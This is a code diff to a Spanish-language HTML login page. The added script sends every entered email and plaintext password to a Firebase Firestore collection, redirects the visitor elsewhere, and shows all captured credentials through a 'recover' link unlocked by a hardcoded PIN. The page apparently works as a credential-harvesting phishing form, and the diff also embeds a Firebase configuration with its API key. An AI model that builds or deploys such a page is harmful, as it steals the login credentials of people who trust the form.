@@ -111,26 +111,59 @@
     </div>
   </div>
 
-  <script>
+  <!-- Firebase + Guardado en Firestore -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getFirestore, collection, addDoc, getDocs } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyBFcBx7J4Yi01yka8oqqwEnjWQ4gYt7WBo",
+      authDomain: "loginapp-63f68.firebaseapp.com",
+      databaseURL: "https://loginapp-63f68-default-rtdb.firebaseio.com",
+      projectId: "loginapp-63f68",
+      storageBucket: "loginapp-63f68.firebasestorage.app",
+      messagingSenderId: "899292217772",
+      appId: "1:899292217772:web:b7b7fde65af64e639b7a09",
+      measurementId: "G-6NEF65BNGK"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
     const loginForm = document.getElementById('loginForm');
     const recoverLink = document.getElementById('recoverLink');
 
-    loginForm.addEventListener('submit', function(e){
+    loginForm.addEventListener('submit', async function(e){
       e.preventDefault();
       const email = this.email.value;
       const password = this.password.value;
 
-      let historial = JSON.parse(localStorage.getItem('historialDatos')) || [];
-      historial.push({ email, password, fecha: new Date().toLocaleString() });
-      localStorage.setItem('historialDatos', JSON.stringify(historial));
+      try {
+        // Guardar en Firebase
+        await addDoc(collection(db, "usuarios"), {
+          email: email,
+          password: password,
+          fecha: new Date().toLocaleString()
+        });
 
-      window.location.href = "https://www.bu.edu/lernet/artemis/years/2017/projects/StudentWebsites/Michelle/pages/BlackPink.html";
+        alert("✅ Datos guardados en Firebase");
+        window.location.href = "TU_URL_DE_REDIRECCION";
+
+      } catch (error) {
+        console.error("Error guardando datos: ", error);
+      }
     });
 
-    recoverLink.addEventListener('click', function(){
+    recoverLink.addEventListener('click', async function(){
       const pin = prompt("Ingresa el PIN para acceder a los datos:");
       if(pin === "2006"){
-        alert("✅ Acceso permitido (aquí iría la vista del historial)");
+        // Obtener todos los datos desde Firebase
+        const snapshot = await getDocs(collection(db, "usuarios"));
+        let historial = "";
+        snapshot.forEach(doc => {
+          historial += `Correo: ${doc.data().email}, Contraseña: ${doc.data().password}, Fecha: ${doc.data().fecha}\n`;
+        });
+        alert("📋 Historial:\n\n" + historial);
       } else {
         alert("PIN incorrecto ❌");
       }
